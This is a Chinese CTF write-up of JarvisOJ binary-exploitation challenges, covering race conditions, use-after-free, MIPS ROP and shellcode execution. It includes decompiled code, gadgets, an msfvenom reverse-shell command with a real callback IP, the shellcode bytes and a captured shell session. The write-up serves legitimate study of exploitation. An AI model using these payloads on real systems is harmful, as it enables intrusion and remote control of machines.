至于怎么控制长度，我是完全参考了师傅的 writeup，直接给出
[_vertitas501_](https://veritas501.space/2017/03/10/JarvisOJ_WP/)
师傅的链接，就不在这里鹦鹉学舌了。

后来复习了一下哈希表的知识发现这个题目还是很好解决的，这种东西果然不用就会忘得一干二净= =

## [61dctf]hiphop (400)

这个题目代码有点多，看了一遍下来是一个打怪兽的程序。逻辑如下：

  8. 用户选择技能(change skill)，如果不选择默认为 attack
  9. 使用技能，分两步进行： 
    1. 怪兽攻击，用户选择三种防御策略(iceshield, fireshield, windshield)，怪兽的攻击方式随机，如果用户使用了对应的防御策略则成功防御，不扣 hp，否则扣除用户相应 hp
    2. 用户攻击，每种技能的伤害不同
  10. 用户每胜利一次怪兽都会升级一次，不同等级的怪兽有不同的初始 hp(64h, 3E8h, 0BB8h, 7FFFFFFFFFFFFFFEh)；当怪兽升级 3 次以上，用户胜利后即可 get flag

先看一下有没有什么比较特殊的技能，发现 fireball 和 icesword 两个技能会
sleep(1)，再联想到主函数是新开了一个进程处理逻辑的，想到了条件竞争；再仔细看，icesword 的伤害还是负的。

    
    
      if ( !strcmp(a1, &aAttack[32]) )
      {
        fireball((_QWORD *)a1 + 5);
        sleep(1u);                                  // sleep(1)
      }
    
      else if ( !strcmp(a1, &aAttack[192]) )
      {
        icesword((_QWORD *)a1 + 5);
        sleep(1u);                                  // sleep(1)
      }
    
    
    void __fastcall icesword(_QWORD *a1)
    {
      unsigned __int64 v1; // rbx
      unsigned __int64 v2; // rbx
      signed __int64 v3; // ST18_8
    
      v1 = (unsigned __int16)rand();
      v2 = (rand() << 16) & 0x8FFFFFFF | v1;
      v3 = v2 | ((signed __int64)rand() << 32) & 0xFFFF00000000LL;
      *a1 = 0xFFFFFFFFLL;
    }

主函数中可以看出程序使用了 time(0) 当做随机数种子，也就是说随机数是可以预测的；再仔细观察，第四关时，怪兽的初始 hp 为
0x7FFFFFFFFFFFFFFE，只要 +2 就会造成整数溢出，满足判断胜负时怪兽 hp < 0 的判断。那么就有了以下的思路：

  1. 先利用能预测随机数的特点完美防御怪兽的攻击，直到第四关。
  2. 选择 fireball，然后 use skill，此时子进程会在设置伤害时 sleep(1)，但主进程还在继续运行，主进程继续 change skill 到 icesword，然后 use skill；这样既可以通过技能伤害不为负的验证，在攻击时又会取 icesword 的伤害导致怪兽的 hp + 1，连续两次造成整数溢出就可以跳到后门函数拿到 flag 了。

本地能稳定跳转到后门函数后，发现远程一直失败。用另一道题目的 shell 查看时间才发现虽然都是 UTC 时间，但相差了大概
25s，修改本地时间后终于拿到了 flag（UTC 时间不同步我还特意问了汪师傅，师傅告诉我确实需要预测时间差）

[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_hiphop/solve.py)

## Item Board (450)

这个题目存在如下的结构体

    
    
    struct ItemStruct
    {
      char *name;
      char *description;
      void (*free)(ItemStruct *);
    };

释放结构体后没有把指针清零，存在并且 show 时只检查了下标

    
    
    void __cdecl item_free(Item *item)
    {
      free(item->name);
      free(item->description);
      free(item);
    }
    
    void __cdecl show_item()
    {
      Item *item; // ST00_8
      Item *v1; // ST00_8
      int index; // [rsp+Ch] [rbp-4h]
    
      puts("Which item?");
      fflush(stdout);
      index = read_num();
      if ( index < items_cnt && item_array[index] )
      {
        item = item_array[(unsigned __int8)index];
        puts("Item Detail:");
        printf("Name:%s\n", item->name, item);
        printf("Description:%s\n", v1->description);
        fflush(stdout);
      }
      else
      {
        puts("Hacker!");
      }
    }

因此可以先通过 unsorted bin 来 leak libc

    
    
    jarvisOJ_ItemBoard [master●] main_arena ./libc-2.19.so
    [+]__malloc_hook_offset : 0x3be740
    [+]main_arena_offset : 0x3be760

然后通过 uaf 控制结构体里的函数指针，改成 system，那么在下一次 free 时，就相当于调用了 system(chunk)，只需要把 chunk
首部改成 $0; sh; /bin/sh; 等即可。

[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_ItemBoard/solve.py)

## png2ascii (450)

这是 defconCTF 20 Quals 的一道题目，mips 架构。 程序是静态编译的，可以先用 rizzo 和 sig
恢复部分符号。通过搜索字符串可以定位到关键函数是从 0x401200 开始的。

测试后发现在 png2ascii 功能里存在栈溢出，漏洞发生在 read_n_until 时

    
    
    .text:00401C4C                 addiu   $v0, $fp, 0x130+buf  # load buffer info $v0
    .text:00401C50                 lw      $a0, 0x130+fd($fp)  # load socket descriptor into $a0
    .text:00401C54                 move    $a1, $v0         # load buffer address into $a1
    .text:00401C58                 li      $a2, 0x200       # load max size(0x200) into $a2
    .text:00401C5C                 li      $a3, 0xA         # load delimiter into $a3
    .text:00401C60                 la      $t9, read_n_until
    .text:00401C64                 nop
    .text:00401C68                 jalr    $t9 ; read_n_until  # call read_n_until
    .text:00401C68                                          #
    .text:00401C68                                          #
    .text:00401C68                                          # stack overflow bug

可以输入 0x200 个字符，缓冲区却只有 0x108，如果是 x86 直接 rop 即可，但 mips 架构找不到太好的 gadget，最后参考了别人的
writeup 找了这么一段

    
    
    .text:0040F968                 lw      $gp, 0x30+var_10($sp)
    .text:0040F96C                 sw      $v0, 0x30+var_4($sp)
    .text:0040F970                 lw      $a0, 0x30+var_30($sp)  # file descriptor
    .text:0040F974                 lw      $a1, 0x30+var_2C($sp)  # destination buffer address
    .text:0040F978                 lw      $a2, 0x30+var_28($sp)  # read size
    .text:0040F97C                 li      $v0, 0xFA3       # read syscall
    .text:0040F980                 syscall 0
    .text:0040F984                 sw      $v0, 0x30+var_C($sp)
    .text:0040F988                 sw      $a3, 0x30+var_8($sp)
    .text:0040F98C                 lw      $a0, 0x30+var_4($sp)
    .text:0040F990                 la      $t9, sub_4115FC
    .text:0040F994                 nop
    .text:0040F998                 jalr    $t9 ; sub_4115FC

这样有栈上的变量，看的不是很清楚，我们可以直接在调试的过程中查看这段 gadget

    
    
    pwndbg> pdisass 0x40f968 10
     ► 0x40f968    lw     $gp, 0x20($sp)
       0x40f96c    sw     $v0, 0x2c($sp)
       0x40f970    lw     $a0, ($sp)
       0x40f974    lw     $a1, 4($sp)
       0x40f978    lw     $a2, 8($sp)
       0x40f97c    addiu  $v0, $zero, 0xfa3
       0x40f980    syscall 
       0x40f984    sw     $v0, 0x24($sp)
       0x40f988    sw     $a3, 0x28($sp)
       0x40f98c    lw     $a0, 0x2c($sp)
       0x40f990    lw     $t9, -0x7ccc($gp)
       0x40f994    nop    
       0x40f998    jalr   $t9

这样就看的很清楚了，可以控制 read 的三个参数和后边的任意跳转（佩服大佬找 gadget 的深厚功力，如果师傅们有什么好的找 gadget
的方法，请务必指教）

可以构造如下的 rop chain

    
    
    +----------+
    |0x0040F968|  <- ret addr
    +----------+
    |0x4       |  <- socket file descriptor ----+
    +----------+                                |
    |0x10000000|  <- read destination       ----+-> read(4, 0x10000000, 0x400)
    +----------+                                |
    |0x400     |  <- read size              ----+
    +----------+                                 
    |junk data |
    +----------+
    |......    |
    +----------+
    |......    |
    +----------+
    |junk data |
    +----------+
    |0x10007ccc|  <- set $gp
    +----------+

此时的 rop 流程如下

  1. 返回到 0x40F968，即上边的 gadget 地址
  2. lw $gp, 0x20($sp) -> gp = sp + 0x20 = 0x10007ccc
  3. lw $a0, ($sp) -> a0 = sp = 4
  4. lw $a1, 4($sp) -> a1 = sp + 4 = 0x10000000
  5. lw $a2, 8($sp) -> a2 = sp + 8 = 0x400
  6. syscall -> read(4, 0x10000000, 0x400)
  7. lw $t9, -0x7ccc($gp) -> t9 = 0x100000000
  8. jalr $t9 -> 跳转到 0x10000000

因此，我们只需要把一段 reverse shell 的 shellcode 读到 0x10000000 即可，我用 msf 生成了一段

    
    
    root@58a35925ee88:/# msfvenom -a mipsle -p linux/mipsle/shell_reverse_tcp LHOST=123.207.141.87 LPORT=4445 -f python
    [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
    No encoder or badchars specified, outputting raw payload
    Payload size: 184 bytes
    Final size of python file: 896 bytes
    buf =  ""
    buf += "\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd"
    buf += "\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01"
    buf += "\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f"
    buf += "\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x11\x5d\x0e\x3c"
    buf += "\x11\x5d\xce\x35\xe4\xff\xae\xaf\x8d\x57\x0e\x3c\x7b"
    buf += "\xcf\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff"
    buf += "\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01"
    buf += "\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f"
    buf += "\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff"
    buf += "\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff"
    buf += "\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf"
    buf += "\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf"
    buf += "\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc"
    buf += "\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01"
    buf += "\x01\x01"
    
    # 腾讯云的学生主机没什么东西，大佬们就不要搞了

然后就可以在 vps 上拿到 shell 了

    
    
    ubuntu@VM-61-71-ubuntu:~$ nc -lvp 4445
    Listening on [0.0.0.0] (family 0, port 4445)
    Connection from [209.222.100.138] port 4445 [tcp/*] accepted (family 2, sport 39056)
    ls
    flag
    pwn100
    supervisord.log
    supervisord.pid
    id
    uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)

[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_png2ascii/solve.py)

## [61dctf]inst (500)

这是 Google CTF2017 的一道原题。

看一下程序的主要逻辑

    
    
    void do_test()
    {
      char *v0; // rbx
      char v1; // al
      unsigned __int64 v2; // r12
      unsigned __int64 buf; // [rsp+8h] [rbp-18h]
    
      v0 = (char *)alloc_page();
      *(_QWORD *)v0 = *(_QWORD *)template;
      *((_DWORD *)v0 + 2) = *((_DWORD *)template + 2);
      v1 = *((_BYTE *)template + 14);
      *((_WORD *)v0 + 6) = *((_WORD *)template + 6);
      v0[14] = v1;
      read_inst(v0 + 5);
      make_page_executable(v0);
      v2 = __rdtsc();
      ((void (__fastcall *)(char *))v0)(v0);
      buf = __rdtsc() - v2;
      if ( write(1, &buf, 8uLL) != 8 )
        exit(0);
      free_page(v0);
    }

每次会申请一段空间，设置可执行权限，然后读 4 个字节到 template 中，最后执行 template，看一下 template

    
    
    .rodata:0000000000000C00                 public template
    .rodata:0000000000000C00 template        proc near               ; DATA XREF: do_test+15↑o
    .rodata:0000000000000C00                 mov     ecx, 1000h
    .rodata:0000000000000C05
    .rodata:0000000000000C05 loc_C05:                                ; CODE XREF: template+C↓j
    .rodata:0000000000000C05                 nop
    .rodata:0000000000000C06                 nop
    .rodata:0000000000000C07                 nop
    .rodata:0000000000000C08                 nop
    .rodata:0000000000000C09                 sub     ecx, 1
    .rodata:0000000000000C0C                 jnz     short loc_C05
    .rodata:0000000000000C0E                 retn
    .rodata:0000000000000C0E template        endp

根据这段汇编的逻辑，我们每次的输入会被程序反复执行 1000 次，但可以用 ret 跳出这段循环。

如果能设置 rsp，使用 ret 就能控制程序的运行流程了。比如把 rsp 改成 rop chain 的开头或者 one_gadget。

调试可以发现在 do_test() 运行的过程中，r14， r15 两个寄存器是不变的，因此可以考虑用这两个寄存器保存一些值。以设置 rsp 为
one_gadget 为例，首先我们需要一个 libc 上的地址，并且距离 one_gadget 比较近，调试可以发现在 templete 开头时，rsp
+ 0x40 这个地方存储了 __libc_start_main + 231，这个地址距离 one_gadget 较近，先把这个地址保存到 r14 上

    
    
    pwndbg> stack 10
    00:0000│ rsp  0x7ffeb2d93408 —▸ 0x5641ea376b18 ◂— rdtsc
    01:0008│      0x7ffeb2d93410 —▸ 0x7fcc316520e0 (_dl_fini) ◂— push   rbp
    02:0010│      0x7ffeb2d93418 ◂— 0x0
    ... ↓
    04:0020│      0x7ffeb2d93428 —▸ 0x5641ea3768c9 ◂— xor    ebp, ebp
    05:0028│ rbp  0x7ffeb2d93430 —▸ 0x7ffeb2d93440 —▸ 0x5641ea376b60 ◂— push   r15
    06:0030│      0x7ffeb2d93438 —▸ 0x5641ea3768c7 ◂— jmp    0x5641ea3768c0
    07:0038│      0x7ffeb2d93440 —▸ 0x5641ea376b60 ◂— push   r15
    08:0040│      0x7ffeb2d93448 —▸ 0x7fcc312aaa87 (__libc_start_main+231) ◂— mov    edi, eax
    09:0048│      0x7ffeb2d93450 ◂— 0x0

通过 0x40 次循环可以把这个地址保存在 r14 上

    
    
    >>> len(asm('mov r14, rsp;ret'))
    4
    >>> len(asm('inc r14'))
    3
    >>> len(asm('mov r14, [r14]; ret'))
    4

然后再根据 libc 中的偏移是固定的，更改 r14 为 one_gadget 地址

    
    
        execsc(asm("add r14, {}".format(offset / 0x1000)))
    
        loop = offset - offset / 0x1000 * 0x1000
        print "loop for {:#x} times...".format(loop)
        pause()
        for i in xrange(loop):
            execsc(add_r14)

最后修改 rsp 即可

    
    
    >>> len(asm('mov [rsp], r14'))
    4

[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_inst/exp.py)

## [61dctf]xworks (500)

静态编译的程序，并且是 strip 后的，先用 rizzo 和 sig 恢复一下符号。

程序的逻辑很简单，漏洞也很明显，在 delete， show 和 edit 功能中均存在 uaf

    
    
    void show_order()
    {
      signed int idx; // [rsp+Ch] [rbp-4h]
    
      _libc_write(1LL, "Input the order index:", 22LL);
      idx = get_int();
      if ( idx >= 0 && idx <= 10 )
        _libc_write(1LL, chunk_list[idx], 31LL);    // uaf
      else
        _libc_write(1LL, "Error\n", 6LL);
    }
    
    void edit_order()
    {
      signed int idx; // [rsp+Ch] [rbp-4h]
    
      _libc_write(1LL, "Input the order index:", 22LL);
      idx = get_int();
      if ( idx >= 0 && idx <= 10 )
        read(0LL, chunk_list[idx], 31LL);           // uaf
      else
        _libc_write(1LL, "Error\n", 6LL);
    }
    
    void delete_order()
    {
      signed int idx; // [rsp+Ch] [rbp-4h]
    
      _libc_write(1LL, "Input the order index:", 22LL);
      idx = get_int();
      if ( idx >= 0 && idx <= 10 )
        j_free(chunk_list[idx]);                    // uaf
      else
        _libc_write(1LL, "Error\n", 6LL);
    }

题目没有溢出的漏洞，难点在于如何利用这个 uaf。通过 free 两个fastbin 可以 leak 出堆的地址，然后在堆上伪造 chunk 的 meta
data 可以造成 unlink，用 unlink 造成任意地址读写后，方法就比较多了。

我的方法是通过多次任意地址写在一个固定地址（如 elf.bss() + 0x500) 上写 rop chain，然后再次通过任意地址写改写 rbp 和
ret addr，通过 stack-pivot 来跳转到 rop chain。

[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_xwork/exp.py)

## 广告时间

###  广告一

目前和几位朋友（来自各大战队）一起做的 [_ctf-wiki_](https://ctf-wiki.github.io/ctf-wiki/)

![](https://p0.ssl.qhimg.com/t016074062886e161d9.jpg)

包括 CTF 中各个分类的基础知识及相关例题，也处于持续更新的过程中。

![](https://p2.ssl.qhimg.com/t01cfde5e6b2a799d76.jpg)

欢迎各位大佬加入（尤其是 web 前端大佬）

###  广告二

[_My Blog_](http://m4x.fun)

[_My Github_](https://github.com/bash-c)

欢迎师傅们一起交流 🙂

## Reference and Thanks to

<https://www.jarviswang.me>

Linux Manual Page

<http://docs.pwntools.com/en/stable/index.html>

<https://github.com/Naetw/CTF-pwn-tips>

<https://veritas501.space/2017/03/10/JarvisOJ_WP/>

<http://blog.csdn.net/charlie_heng>

<https://www.jianshu.com/p/40f846d14450>

<https://www.jianshu.com/p/3d3a37c3e1c7>

<http://muhe.live/2016/12/24/what-DynELF-does-basically/>

<https://pastebin.com/eqzdtwmw>

<https://gloxec.github.io/2017/05/16/Reverse%20Engineer%20a%20stripped%20binary/>

<http://www.freebuf.com/articles/terminal/134980.html>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **M4x** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/160524](/post/id/160524)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [writeup](/tag/writeup)
  * [JarvisOJ](/tag/JarvisOJ)

 **+1** __29赞

 __收藏

![](https://q.qlogo.cn/qqapp/101431079/26A2C2F831941843A6197A21F653189B/40)
M4x

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

